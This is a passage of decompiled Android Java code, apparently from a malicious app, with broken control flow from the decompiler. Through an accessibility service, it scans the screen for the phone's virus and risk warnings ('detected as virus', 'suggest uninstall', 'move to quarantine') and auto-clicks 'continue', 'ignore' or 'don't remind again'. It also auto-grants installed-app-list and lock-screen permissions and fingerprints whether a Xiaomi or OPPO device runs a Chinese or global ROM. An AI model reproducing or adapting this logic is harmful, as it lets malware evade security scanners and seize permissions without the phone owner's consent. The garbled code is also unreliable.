    /* JADX WARN: Removed duplicated region for block: B:61:0x0167 A[Catch: Exception -> 0x0113, TryCatch #2 {Exception -> 0x0113, blocks: (B:58:0x0160, B:87:0x01c2, B:117:0x024c, B:134:0x028c, B:153:0x02d5, B:174:0x0326, B:222:0x0445, B:242:0x049b, B:269:0x04f9, B:280:0x051f, B:291:0x0543, B:293:0x058c, B:314:0x05dc, B:329:0x0611, B:331:0x064b, B:335:0x066f, B:317:0x05e4, B:318:0x05e8, B:320:0x05ee, B:322:0x05fd, B:296:0x0594, B:297:0x0598, B:299:0x059e, B:301:0x05ab, B:303:0x05b1, B:305:0x05b9, B:307:0x05c1, B:309:0x05c9, B:283:0x0527, B:284:0x052b, B:286:0x0531, B:272:0x0501, B:273:0x0505, B:275:0x050b, B:277:0x0518, B:245:0x04a5, B:246:0x04a9, B:248:0x04af, B:250:0x04c2, B:252:0x04c8, B:254:0x04ce, B:256:0x04d4, B:258:0x04da, B:260:0x04e0, B:262:0x04e6, B:264:0x04ec, B:225:0x044c, B:226:0x0450, B:228:0x0456, B:230:0x0465, B:233:0x0470, B:234:0x0474, B:236:0x047a, B:177:0x034c, B:178:0x0350, B:180:0x0356, B:182:0x0363, B:184:0x036b, B:186:0x0373, B:188:0x037b, B:190:0x0383, B:192:0x038d, B:194:0x0397, B:196:0x03a1, B:208:0x03f8, B:211:0x0407, B:212:0x040b, B:214:0x0411, B:216:0x0424, B:156:0x02dc, B:157:0x02e0, B:159:0x02e6, B:161:0x02f5, B:164:0x02fc, B:165:0x0300, B:167:0x0306, B:169:0x0313, B:171:0x031b, B:137:0x0293, B:138:0x0297, B:140:0x029d, B:142:0x02ac, B:145:0x02b3, B:146:0x02b7, B:148:0x02bd, B:150:0x02ca, B:120:0x0253, B:121:0x0257, B:123:0x025d, B:125:0x026c, B:128:0x0273, B:129:0x0277, B:131:0x027d, B:90:0x01ca, B:91:0x01ce, B:93:0x01d4, B:95:0x01e5, B:97:0x01ed, B:99:0x01f5, B:103:0x0201, B:106:0x0208, B:107:0x020c, B:109:0x0212, B:111:0x021f, B:61:0x0167, B:62:0x016b, B:64:0x0171, B:66:0x017e, B:68:0x0184, B:70:0x018a, B:72:0x0190, B:74:0x0196, B:76:0x019c, B:79:0x01a3, B:80:0x01a7, B:82:0x01ad, B:84:0x01ba, B:32:0x00d6, B:33:0x00da, B:35:0x00e0, B:37:0x00f5, B:39:0x00fd, B:41:0x0105, B:46:0x0117, B:49:0x011e, B:50:0x0122, B:52:0x0128, B:54:0x0135), top: B:364:0x00d6 }] */
    /* JADX WARN: Removed duplicated region for block: B:89:0x01c8  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x01ca A[Catch: Exception -> 0x0113, TryCatch #2 {Exception -> 0x0113, blocks: (B:58:0x0160, B:87:0x01c2, B:117:0x024c, B:134:0x028c, B:153:0x02d5, B:174:0x0326, B:222:0x0445, B:242:0x049b, B:269:0x04f9, B:280:0x051f, B:291:0x0543, B:293:0x058c, B:314:0x05dc, B:329:0x0611, B:331:0x064b, B:335:0x066f, B:317:0x05e4, B:318:0x05e8, B:320:0x05ee, B:322:0x05fd, B:296:0x0594, B:297:0x0598, B:299:0x059e, B:301:0x05ab, B:303:0x05b1, B:305:0x05b9, B:307:0x05c1, B:309:0x05c9, B:283:0x0527, B:284:0x052b, B:286:0x0531, B:272:0x0501, B:273:0x0505, B:275:0x050b, B:277:0x0518, B:245:0x04a5, B:246:0x04a9, B:248:0x04af, B:250:0x04c2, B:252:0x04c8, B:254:0x04ce, B:256:0x04d4, B:258:0x04da, B:260:0x04e0, B:262:0x04e6, B:264:0x04ec, B:225:0x044c, B:226:0x0450, B:228:0x0456, B:230:0x0465, B:233:0x0470, B:234:0x0474, B:236:0x047a, B:177:0x034c, B:178:0x0350, B:180:0x0356, B:182:0x0363, B:184:0x036b, B:186:0x0373, B:188:0x037b, B:190:0x0383, B:192:0x038d, B:194:0x0397, B:196:0x03a1, B:208:0x03f8, B:211:0x0407, B:212:0x040b, B:214:0x0411, B:216:0x0424, B:156:0x02dc, B:157:0x02e0, B:159:0x02e6, B:161:0x02f5, B:164:0x02fc, B:165:0x0300, B:167:0x0306, B:169:0x0313, B:171:0x031b, B:137:0x0293, B:138:0x0297, B:140:0x029d, B:142:0x02ac, B:145:0x02b3, B:146:0x02b7, B:148:0x02bd, B:150:0x02ca, B:120:0x0253, B:121:0x0257, B:123:0x025d, B:125:0x026c, B:128:0x0273, B:129:0x0277, B:131:0x027d, B:90:0x01ca, B:91:0x01ce, B:93:0x01d4, B:95:0x01e5, B:97:0x01ed, B:99:0x01f5, B:103:0x0201, B:106:0x0208, B:107:0x020c, B:109:0x0212, B:111:0x021f, B:61:0x0167, B:62:0x016b, B:64:0x0171, B:66:0x017e, B:68:0x0184, B:70:0x018a, B:72:0x0190, B:74:0x0196, B:76:0x019c, B:79:0x01a3, B:80:0x01a7, B:82:0x01ad, B:84:0x01ba, B:32:0x00d6, B:33:0x00da, B:35:0x00e0, B:37:0x00f5, B:39:0x00fd, B:41:0x0105, B:46:0x0117, B:49:0x011e, B:50:0x0122, B:52:0x0128, B:54:0x0135), top: B:364:0x00d6 }] */
    /* renamed from: b8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m212458b8(String str) {
        String str2;
        String str3;
        String str4;
        CharSequence charSequence;
        String str5;
        CharSequence charSequence2;
        CharSequence charSequence3;
        String str6;
        String str7;
        String str8;
        String str9;
        String str10;
        CharSequence charSequence4;
        CharSequence charSequence5;
        String str11;
        CharSequence charSequence6;
        String str12;
        String str13;
        CharSequence charSequence7;
        String str14;
        String str15;
        boolean z;
        boolean z2;
        boolean z3;
        LinkedHashSet<String> linkedHashSet;
        String str16;
        boolean z4;
        boolean z5;
        Object obj;
        Context context = this.f53209a1;
        try {
            Object systemService = context.getSystemService("keyguard");
            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
            if (keyguardManager == null || !keyguardManager.isKeyguardLocked()) {
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (jCurrentTimeMillis - this.f55150a7 >= this.f55151a8) {
                    this.f55150a7 = jCurrentTimeMillis;
                    Locale locale = Locale.ROOT;
                    String lowerCase = str.toLowerCase(locale);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    String packageName = context.getPackageName();
                    t60.m214694b5(packageName, "context.packageName");
                    String lowerCase2 = packageName.toLowerCase(locale);
                    t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    if (!lowerCase.equals(lowerCase2)) {
                        AccessibilityNodeInfo accessibilityNodeInfoM211468g2 = this.f53208a0.m211468g2();
                        String str17 = this.f55148a5;
                        if (accessibilityNodeInfoM211468g2 == null) {
                            t60.m214702c3(str17, "📱 [弹窗检测] root为空，跳过");
                            return;
                        }
                        LinkedHashSet<String> linkedHashSet2 = new LinkedHashSet();
                        m212438a6(accessibilityNodeInfoM211468g2, linkedHashSet2);
                        if (linkedHashSet2.isEmpty()) {
                            t60.m214702c3(str17, "📱 [弹窗检测] 文本为空，跳过");
                            return;
                        }
                        boolean zIsEmpty = linkedHashSet2.isEmpty();
                        String str18 = "被检测为病毒";
                        String str19 = "被检视为病毒";
                        String str20 = "应用列表";
                        String str21 = "查看已安装应用";
                        String str22 = "获取已安装应用";
                        CharSequence charSequence8 = "Continue";
                        String str23 = "读取已安装应用";
                        CharSequence charSequence9 = "建议立即卸载";
                        CharSequence charSequence10 = "高风险";
                        CharSequence charSequence11 = "发现恶意应用";
                        String str24 = "恢复开启";
                        String str25 = "继续使用";
                        CharSequence charSequence12 = "应用风险";
                        String str26 = "Allow";
                        CharSequence charSequence13 = "发现病毒应用";
                        String str27 = "允许";
                        CharSequence charSequence14 = "存在高风险";
                        if (zIsEmpty) {
                            str3 = str19;
                            str2 = str18;
                            if (!linkedHashSet2.isEmpty()) {
                                for (String str28 : linkedHashSet2) {
                                    if (AbstractC0779a1.m213652a5(str28, "读取已安装应用列表", false) || AbstractC0779a1.m213652a5(str28, "请求读取已安装应用", false) || AbstractC0779a1.m213652a5(str28, "读取已安装应用", false) || AbstractC0779a1.m213652a5(str28, "获取已安装应用", false) || AbstractC0779a1.m213652a5(str28, "查看已安装应用", false) || AbstractC0779a1.m213652a5(str28, "应用列表", false)) {
                                        if (!linkedHashSet2.isEmpty()) {
                                            for (String str29 : linkedHashSet2) {
                                                if (!AbstractC0779a1.m213652a5(str29, "允许", false) && !AbstractC0779a1.m213652a5(str29, "Allow", false)) {
                                                }
                                                str4 = "允许";
                                                charSequence = charSequence11;
                                                str5 = str25;
                                                charSequence2 = charSequence13;
                                                charSequence3 = charSequence14;
                                                str6 = str2;
                                                str7 = str3;
                                                str8 = "获取已安装应用";
                                                str9 = "查看已安装应用";
                                                str10 = "Allow";
                                                charSequence4 = charSequence8;
                                                charSequence5 = charSequence10;
                                                str11 = str24;
                                                charSequence6 = charSequence12;
                                                str12 = str4;
                                            }
                                        }
                                    }
                                }
                            }
                            if (!linkedHashSet2.isEmpty()) {
                                Iterator it = linkedHashSet2.iterator();
                                while (it.hasNext()) {
                                    String str30 = (String) it.next();
                                    Iterator it2 = it;
                                    if (!AbstractC0779a1.m213652a5(str30, "移入管控", false) && !AbstractC0779a1.m213652a5(str30, "移入风险管控", false) && !AbstractC0779a1.m213652a5(str30, "应用管控中心", false) && !AbstractC0779a1.m213652a5(str30, "管控恶意应用", false)) {
                                        it = it2;
                                    }
                                    if (!linkedHashSet2.isEmpty()) {
                                        Iterator it3 = linkedHashSet2.iterator();
                                        while (it3.hasNext()) {
                                            String str31 = (String) it3.next();
                                            if (!AbstractC0779a1.m213652a5(str31, "取消", false)) {
                                                Iterator it4 = it3;
                                                if (!AbstractC0779a1.m213652a5(str31, "Cancel", false)) {
                                                    it3 = it4;
                                                }
                                            }
                                            str4 = "取消";
                                        }
                                    }
                                }
                            }
                            if (!linkedHashSet2.isEmpty()) {
                                Iterator it5 = linkedHashSet2.iterator();
                                while (true) {
                                    if (!it5.hasNext()) {
                                        break;
                                    }
                                    if (AbstractC0779a1.m213652a5((String) it5.next(), "移入隔离箱", false)) {
                                        if (!linkedHashSet2.isEmpty()) {
                                            Iterator it6 = linkedHashSet2.iterator();
                                            while (it6.hasNext()) {
                                                if (AbstractC0779a1.m213652a5((String) it6.next(), "暂不移入", false)) {
                                                    str4 = "暂不移入";
                                                    break;
                                                }
                                            }
                                        }
                                    }
                                }
                                charSequence = charSequence11;
                                str5 = str25;
                                charSequence2 = charSequence13;
                                charSequence3 = charSequence14;
                                str6 = str2;
                                str7 = str3;
                                str8 = "获取已安装应用";
                                str9 = "查看已安装应用";
                                str10 = "Allow";
                                charSequence4 = charSequence8;
                                str11 = str24;
                                charSequence6 = charSequence12;
                                str12 = "允许";
                                charSequence5 = charSequence10;
                                str13 = "应用列表";
                                charSequence7 = charSequence9;
                                str14 = "读取已安装应用";
                                if (linkedHashSet2.isEmpty()) {
                                    str15 = str4;
                                    z = false;
                                    if (linkedHashSet2.isEmpty()) {
                                        for (String str32 : linkedHashSet2) {
                                            if (AbstractC0779a1.m213652a5(str32, str5, false) || AbstractC0779a1.m213652a5(str32, charSequence4, false)) {
                                                z2 = true;
                                                break;
                                            }
                                        }
                                        z2 = false;
                                        if (linkedHashSet2.isEmpty()) {
                                        }
                                    } else {
                                        z2 = false;
                                        if (linkedHashSet2.isEmpty()) {
                                            Iterator it7 = linkedHashSet2.iterator();
                                            while (it7.hasNext()) {
                                                if (AbstractC0779a1.m213652a5((String) it7.next(), str11, false)) {
                                                    z3 = true;
                                                    break;
                                                }
                                            }
                                            z3 = false;
                                            if (z) {
                                            }
                                            if (linkedHashSet.isEmpty()) {
                                            }
                                        } else {
                                            z3 = false;
                                            if (z) {
                                                linkedHashSet = linkedHashSet2;
                                                str16 = str17;
                                            } else {
                                                str16 = str17;
                                                t60.m214726f4(str16, "🦠 [病毒弹窗调试] 检测到病毒关键词！hasContinueButton=" + z2 + ", hasRestoreButton=" + z3);
                                                linkedHashSet = linkedHashSet2;
                                                t60.m214726f4(str16, "🦠 [病毒弹窗调试] 收集到的文本(" + linkedHashSet2.size() + "个): " + AbstractC0715je.m213301i8(linkedHashSet, 20));
                                            }
                                            if (linkedHashSet.isEmpty()) {
                                                for (String str33 : linkedHashSet) {
                                                    if (!AbstractC0779a1.m213652a5(str33, "读取已安装应用列表", false) && !AbstractC0779a1.m213652a5(str33, "请求读取已安装应用", false)) {
                                                        String str34 = str14;
                                                        if (!AbstractC0779a1.m213652a5(str33, str34, false)) {
                                                            String str35 = str8;
                                                            if (!AbstractC0779a1.m213652a5(str33, str35, false)) {
                                                                String str36 = str9;
                                                                if (!AbstractC0779a1.m213652a5(str33, str36, false)) {
                                                                    String str37 = str13;
                                                                    if (!AbstractC0779a1.m213652a5(str33, str37, false)) {
                                                                        str14 = str34;
                                                                        str8 = str35;
                                                                        str9 = str36;
                                                                        str13 = str37;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                    z4 = true;
                                                }
                                                z4 = false;
                                                if (linkedHashSet.isEmpty()) {
                                                }
                                                if (z4) {
                                                }
                                                if (str15 != null) {
                                                }
                                            } else {
                                                z4 = false;
                                                if (linkedHashSet.isEmpty()) {
                                                    for (String str38 : linkedHashSet) {
                                                        String str39 = str12;
                                                        if (!AbstractC0779a1.m213652a5(str38, str39, false)) {
                                                            String str40 = str10;
                                                            if (!AbstractC0779a1.m213652a5(str38, str40, false)) {
                                                                str12 = str39;
                                                                str10 = str40;
                                                            }
                                                        }
                                                        z5 = true;
                                                    }
                                                    z5 = false;
                                                } else {
                                                    z5 = false;
                                                }
                                                if (z4) {
                                                    t60.m214726f4(str16, "📱 [应用列表权限调试] 检测到关键词！hasAllowButton=" + z5);
                                                    t60.m214726f4(str16, "📱 [应用列表权限调试] 收集到的文本(" + linkedHashSet.size() + "个): " + AbstractC0715je.m213301i8(linkedHashSet, 30));
                                                }
                                                if (str15 != null) {
                                                    StringBuilder sb = new StringBuilder();
                                                    sb.append("[弹窗检测] 检测到弹窗，尝试点击: ");
                                                    String str41 = str15;
                                                    sb.append(str41);
                                                    t60.m214704c5(str16, sb.toString());
                                                    try {
                                                        if (str41.equals("风险提示_继续使用")) {
                                                            obj = "风险提示_恢复开启";
                                                        } else {
                                                            obj = "风险提示_恢复开启";
                                                            if (!str41.equals(obj)) {
                                                                if (m212449a5(accessibilityNodeInfoM211468g2, str41)) {
                                                                    t60.m214704c5(str16, "[弹窗检测] ✅ 已点击'" + str41 + "'");
                                                                    return;
                                                                }
                                                                return;
                                                            }
                                                        }
                                                        String str42 = str41.equals(obj) ? str11 : str5;
                                                        if (!m212447a3(accessibilityNodeInfoM211468g2, "不再提示") && !m212447a3(accessibilityNodeInfoM211468g2, "不再提醒")) {
                                                            if (m212449a5(accessibilityNodeInfoM211468g2, str42)) {
                                                                t60.m214704c5(str16, "[弹窗检测] ✅ 已点击'" + str42 + "'");
                                                                return;
                                                            }
                                                            return;
                                                        }
                                                        t60.m214704c5(str16, "[弹窗检测] ✅ 已勾选'不再提示'");
                                                        this.f55147a4.postDelayed(new RunnableC1052p1(this, 17, str42), 300L);
                                                        return;
                                                    } catch (Exception unused) {
                                                        return;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    Iterator it8 = linkedHashSet2.iterator();
                                    while (it8.hasNext()) {
                                        Iterator it9 = it8;
                                        String str43 = (String) it8.next();
                                        str15 = str4;
                                        if (!AbstractC0779a1.m213652a5(str43, "风险提示", false) && !AbstractC0779a1.m213652a5(str43, str7, false) && !AbstractC0779a1.m213652a5(str43, str6, false) && !AbstractC0779a1.m213652a5(str43, charSequence3, false) && !AbstractC0779a1.m213652a5(str43, charSequence2, false) && !AbstractC0779a1.m213652a5(str43, charSequence, false) && !AbstractC0779a1.m213652a5(str43, charSequence6, false) && !AbstractC0779a1.m213652a5(str43, charSequence5, false) && !AbstractC0779a1.m213652a5(str43, charSequence7, false)) {
                                            str4 = str15;
                                            it8 = it9;
                                        }
                                        z = true;
                                    }
                                    str15 = str4;
                                    z = false;
                                    if (linkedHashSet2.isEmpty()) {
                                    }
                                }
                            }
                            if (!linkedHashSet2.isEmpty()) {
                                Iterator it10 = linkedHashSet2.iterator();
                                while (true) {
                                    if (!it10.hasNext()) {
                                        break;
                                    }
                                    if (AbstractC0779a1.m213652a5((String) it10.next(), "病毒危险", false)) {
                                        if (!linkedHashSet2.isEmpty()) {
                                            for (String str44 : linkedHashSet2) {
                                                if (AbstractC0779a1.m213652a5(str44, "忽略", false) || AbstractC0779a1.m213652a5(str44, "Ignore", false)) {
                                                    str4 = "忽略";
                                                    break;
                                                }
                                            }
                                        }
                                    }
                                }
                                charSequence = charSequence11;
                                str5 = str25;
                                charSequence2 = charSequence13;
                                charSequence3 = charSequence14;
                                str6 = str2;
                                str7 = str3;
                                str8 = "获取已安装应用";
                                str9 = "查看已安装应用";
                                str10 = "Allow";
                                charSequence4 = charSequence8;
                                str11 = str24;
                                charSequence6 = charSequence12;
                                str12 = "允许";
                                charSequence5 = charSequence10;
                                str13 = "应用列表";
                                charSequence7 = charSequence9;
                                str14 = "读取已安装应用";
                                if (linkedHashSet2.isEmpty()) {
                                }
                            }
                            if (!linkedHashSet2.isEmpty()) {
                                Iterator it11 = linkedHashSet2.iterator();
                                while (true) {
                                    if (!it11.hasNext()) {
                                        break;
                                    }
                                    if (AbstractC0779a1.m213652a5((String) it11.next(), "已管控病毒应用", false)) {
                                        if (!linkedHashSet2.isEmpty()) {
                                            for (String str45 : linkedHashSet2) {
                                                if (AbstractC0779a1.m213652a5(str45, "知道了", false) || AbstractC0779a1.m213652a5(str45, "Got it", false) || str45.equals("OK")) {
                                                    str4 = "知道了";
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            if (linkedHashSet2.isEmpty()) {
                                charSequence = charSequence11;
                                str5 = str25;
                                charSequence2 = charSequence13;
                                charSequence3 = charSequence14;
                                str6 = str2;
                                str7 = str3;
                                str8 = "获取已安装应用";
                                str9 = "查看已安装应用";
                                str10 = str26;
                                charSequence4 = charSequence8;
                                charSequence6 = charSequence12;
                                str12 = str27;
                                charSequence5 = charSequence10;
                                str13 = str20;
                                charSequence7 = charSequence9;
                                if (linkedHashSet2.isEmpty()) {
                                    Iterator it12 = linkedHashSet2.iterator();
                                    while (true) {
                                        if (!it12.hasNext()) {
                                            break;
                                        }
                                        Iterator it13 = it12;
                                        if (!AbstractC0779a1.m213652a5((String) it12.next(), charSequence6, false)) {
                                            it12 = it13;
                                        } else {
                                            if (linkedHashSet2.isEmpty()) {
                                                break;
                                            }
                                            Iterator it14 = linkedHashSet2.iterator();
                                            while (it14.hasNext()) {
                                                String str46 = (String) it14.next();
                                                Iterator it15 = it14;
                                                str14 = str23;
                                                str11 = str24;
                                                if (AbstractC0779a1.m213652a5(str46, str11, false)) {
                                                    str4 = "风险提示_恢复开启";
                                                    break;
                                                } else {
                                                    str24 = str11;
                                                    it14 = it15;
                                                    str23 = str14;
                                                }
                                            }
                                        }
                                    }
                                    if (linkedHashSet2.isEmpty()) {
                                    }
                                }
                                str14 = str23;
                                str11 = str24;
                                str4 = null;
                                if (linkedHashSet2.isEmpty()) {
                                }
                            } else {
                                Iterator it16 = linkedHashSet2.iterator();
                                while (it16.hasNext()) {
                                    String str47 = (String) it16.next();
                                    if (AbstractC0779a1.m213652a5(str47, "风险提示", false)) {
                                        charSequence = charSequence11;
                                        charSequence2 = charSequence13;
                                        charSequence3 = charSequence14;
                                        str6 = str2;
                                        str7 = str3;
                                    } else {
                                        str7 = str3;
                                        if (AbstractC0779a1.m213652a5(str47, str7, false)) {
                                            charSequence = charSequence11;
                                            charSequence2 = charSequence13;
                                            charSequence3 = charSequence14;
                                            str6 = str2;
                                        } else {
                                            str6 = str2;
                                            if (AbstractC0779a1.m213652a5(str47, str6, false)) {
                                                charSequence = charSequence11;
                                                charSequence2 = charSequence13;
                                                charSequence3 = charSequence14;
                                            } else {
                                                charSequence3 = charSequence14;
                                                if (AbstractC0779a1.m213652a5(str47, charSequence3, false)) {
                                                    charSequence = charSequence11;
                                                    charSequence2 = charSequence13;
                                                } else {
                                                    charSequence2 = charSequence13;
                                                    if (AbstractC0779a1.m213652a5(str47, charSequence2, false)) {
                                                        charSequence = charSequence11;
                                                    } else {
                                                        Iterator it17 = it16;
                                                        charSequence = charSequence11;
                                                        if (!AbstractC0779a1.m213652a5(str47, charSequence, false)) {
                                                            str10 = str26;
                                                            charSequence6 = charSequence12;
                                                            if (AbstractC0779a1.m213652a5(str47, charSequence6, false)) {
                                                                str12 = str27;
                                                                charSequence5 = charSequence10;
                                                                str13 = str20;
                                                                charSequence7 = charSequence9;
                                                                if (!linkedHashSet2.isEmpty()) {
                                                                }
                                                                str8 = str22;
                                                                charSequence4 = charSequence8;
                                                                str5 = str25;
                                                                str9 = str21;
                                                                if (linkedHashSet2.isEmpty()) {
                                                                }
                                                                str14 = str23;
                                                                str11 = str24;
                                                                str4 = null;
                                                                if (linkedHashSet2.isEmpty()) {
                                                                }
                                                            } else {
                                                                str12 = str27;
                                                                charSequence5 = charSequence10;
                                                                if (AbstractC0779a1.m213652a5(str47, charSequence5, false)) {
                                                                    str13 = str20;
                                                                    charSequence7 = charSequence9;
                                                                    if (!linkedHashSet2.isEmpty()) {
                                                                    }
                                                                    str8 = str22;
                                                                    charSequence4 = charSequence8;
                                                                    str5 = str25;
                                                                    str9 = str21;
                                                                    if (linkedHashSet2.isEmpty()) {
                                                                    }
                                                                    str14 = str23;
                                                                    str11 = str24;
                                                                    str4 = null;
                                                                    if (linkedHashSet2.isEmpty()) {
                                                                    }
                                                                } else {
                                                                    str13 = str20;
                                                                    charSequence7 = charSequence9;
                                                                    if (AbstractC0779a1.m213652a5(str47, charSequence7, false)) {
                                                                        if (!linkedHashSet2.isEmpty()) {
                                                                            Iterator it18 = linkedHashSet2.iterator();
                                                                            while (it18.hasNext()) {
                                                                                String str48 = (String) it18.next();
                                                                                Iterator it19 = it18;
                                                                                str5 = str25;
                                                                                str9 = str21;
                                                                                if (AbstractC0779a1.m213652a5(str48, str5, false)) {
                                                                                    str8 = str22;
                                                                                    charSequence4 = charSequence8;
                                                                                } else {
                                                                                    str8 = str22;
                                                                                    charSequence4 = charSequence8;
                                                                                    if (!AbstractC0779a1.m213652a5(str48, charSequence4, false)) {
                                                                                        charSequence8 = charSequence4;
                                                                                        str21 = str9;
                                                                                        str22 = str8;
                                                                                        str25 = str5;
                                                                                        it18 = it19;
                                                                                    }
                                                                                }
                                                                                str14 = "读取已安装应用";
                                                                                str4 = "风险提示_继续使用";
                                                                                str11 = str24;
                                                                            }
                                                                        }
                                                                        str8 = str22;
                                                                        charSequence4 = charSequence8;
                                                                        str5 = str25;
                                                                        str9 = str21;
                                                                        if (linkedHashSet2.isEmpty()) {
                                                                        }
                                                                        str14 = str23;
                                                                        str11 = str24;
                                                                        str4 = null;
                                                                        if (linkedHashSet2.isEmpty()) {
                                                                        }
                                                                    } else {
                                                                        str3 = str7;
                                                                        str2 = str6;
                                                                        charSequence14 = charSequence3;
                                                                        charSequence9 = charSequence7;
                                                                        str20 = str13;
                                                                        charSequence10 = charSequence5;
                                                                        str27 = str12;
                                                                        charSequence12 = charSequence6;
                                                                        str26 = str10;
                                                                        charSequence11 = charSequence;
                                                                        it16 = it17;
                                                                        charSequence13 = charSequence2;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    str10 = str26;
                                    charSequence6 = charSequence12;
                                    str12 = str27;
                                    charSequence5 = charSequence10;
                                    str13 = str20;
                                    charSequence7 = charSequence9;
                                    if (!linkedHashSet2.isEmpty()) {
                                    }
                                    str8 = str22;
                                    charSequence4 = charSequence8;
                                    str5 = str25;
                                    str9 = str21;
                                    if (linkedHashSet2.isEmpty()) {
                                    }
                                    str14 = str23;
                                    str11 = str24;
                                    str4 = null;
                                    if (linkedHashSet2.isEmpty()) {
                                    }
                                }
                                charSequence = charSequence11;
                                str5 = str25;
                                charSequence2 = charSequence13;
                                charSequence3 = charSequence14;
                                str6 = str2;
                                str7 = str3;
                                str8 = "获取已安装应用";
                                str9 = "查看已安装应用";
                                str10 = str26;
                                charSequence4 = charSequence8;
                                charSequence6 = charSequence12;
                                str12 = str27;
                                charSequence5 = charSequence10;
                                str13 = str20;
                                charSequence7 = charSequence9;
                                if (linkedHashSet2.isEmpty()) {
                                }
                                str14 = str23;
                                str11 = str24;
                                str4 = null;
                                if (linkedHashSet2.isEmpty()) {
                                }
                            }
                        } else {
                            try {
                                for (String str49 : linkedHashSet2) {
                                    str2 = str18;
                                    str3 = str19;
                                    if (!AbstractC0779a1.m213652a5(str49, "锁屏上显示", false) && !AbstractC0779a1.m213652a5(str49, "锁屏上方显示", false) && !AbstractC0779a1.m213652a5(str49, "Display over lock screen", false) && !AbstractC0779a1.m213652a5(str49, "Show on lock screen", false)) {
                                        str18 = str2;
                                        str19 = str3;
                                    }
                                    if (!linkedHashSet2.isEmpty()) {
                                        for (String str50 : linkedHashSet2) {
                                            if (AbstractC0779a1.m213652a5(str50, "允许", false) || AbstractC0779a1.m213652a5(str50, "Allow", false)) {
                                                break;
                                            }
                                        }
                                    }
                                    if (!linkedHashSet2.isEmpty()) {
                                    }
                                    if (!linkedHashSet2.isEmpty()) {
                                    }
                                    if (!linkedHashSet2.isEmpty()) {
                                    }
                                    if (!linkedHashSet2.isEmpty()) {
                                    }
                                    if (!linkedHashSet2.isEmpty()) {
                                    }
                                    if (linkedHashSet2.isEmpty()) {
                                    }
                                }
                                str3 = str19;
                                str2 = str18;
                                if (!linkedHashSet2.isEmpty()) {
                                }
                                if (!linkedHashSet2.isEmpty()) {
                                }
                                if (!linkedHashSet2.isEmpty()) {
                                }
                                if (!linkedHashSet2.isEmpty()) {
                                }
                                if (!linkedHashSet2.isEmpty()) {
                                }
                                if (linkedHashSet2.isEmpty()) {
                                }
                            } catch (Exception unused2) {
                            }
                        }
                    }
                }
            }
        } catch (Exception unused3) {
        }
    }

    /* renamed from: b9 */
    public final boolean m212459b9() throws Throwable {
        Locale locale;
        String lowerCase;
        String lowerCase2;
        String strM212441b6;
        String lowerCase3;
        String strM212441b62;
        TelephonyManager telephonyManager;
        String upperCase;
        String networkCountryIso;
        String simCountryIso;
        try {
            String str = Build.BRAND;
            t60.m214694b5(str, "BRAND");
            locale = Locale.ROOT;
            lowerCase = str.toLowerCase(locale);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            String str2 = Build.MANUFACTURER;
            t60.m214694b5(str2, "MANUFACTURER");
            lowerCase2 = str2.toLowerCase(locale);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            String str3 = Build.MODEL;
            try {
            } catch (Exception e) {
                e = e;
                e.getMessage();
                return false;
            }
        } catch (Exception e2) {
            e = e2;
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "redmi", false) || AbstractC0779a1.m213652a5(lowerCase, "poco", false)) {
            String strM212441b63 = m212441b6("ro.product.mod_device");
            if (strM212441b63 != null) {
                String lowerCase4 = strM212441b63.toLowerCase(locale);
                t60.m214694b5(lowerCase4, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (AbstractC0779a1.m213652a5(lowerCase4, "global", false)) {
                }
                return true;
            }
            String strM212441b64 = m212441b6("ro.miui.region");
            if (strM212441b64 != null) {
                String upperCase2 = strM212441b64.toUpperCase(locale);
                t60.m214694b5(upperCase2, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                if (!upperCase2.equals("CN")) {
                    return true;
                }
            }
            return false;
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase, "oneplus", false) || AbstractC0779a1.m213652a5(lowerCase, "realme", false) || AbstractC0779a1.m213652a5(lowerCase2, "oplus", false)) {
            String strM212441b65 = m212441b6("ro.build.version.ota");
            if (strM212441b65 != null) {
                String upperCase3 = strM212441b65.toUpperCase(locale);
                t60.m214694b5(upperCase3, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                if (!new Regex("[_./\\-](GLO|INT|EEA|GLOBAL)[_./\\-]?", RegexOption.f57632a1).f57628a0.matcher(upperCase3).find() && !AbstractC0779a1.m213655a8(upperCase3, false, "_GLO") && !AbstractC0779a1.m213655a8(upperCase3, false, "_INT") && !AbstractC0779a1.m213655a8(upperCase3, false, "_EEA") && !AbstractC0779a1.m213679d2(upperCase3, false, "GLO") && !AbstractC0779a1.m213679d2(upperCase3, false, "INT_")) {
                }
                return true;
            }
            String strM212441b66 = m212441b6("ro.oxygen.version");
            if (strM212441b66 == null || strM212441b66.length() == 0) {
                Iterator it = AbstractC0716jf.m213306g5("ro.vendor.oplus.regionmark", "ro.oplus.regionmark", "ro.build.oplus.regionmark").iterator();
                while (it.hasNext()) {
                    String strM212441b67 = m212441b6((String) it.next());
                    if (strM212441b67 != null) {
                        String upperCase4 = strM212441b67.toUpperCase(Locale.ROOT);
                        t60.m214694b5(upperCase4, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                        if (upperCase4.equals("CN")) {
                            return false;
                        }
                    }
                }
                m212441b6("ro.build.version.ota");
                m212441b6("ro.oxygen.version");
                m212441b6("ro.separate.soft");
                return false;
            }
            return true;
        }
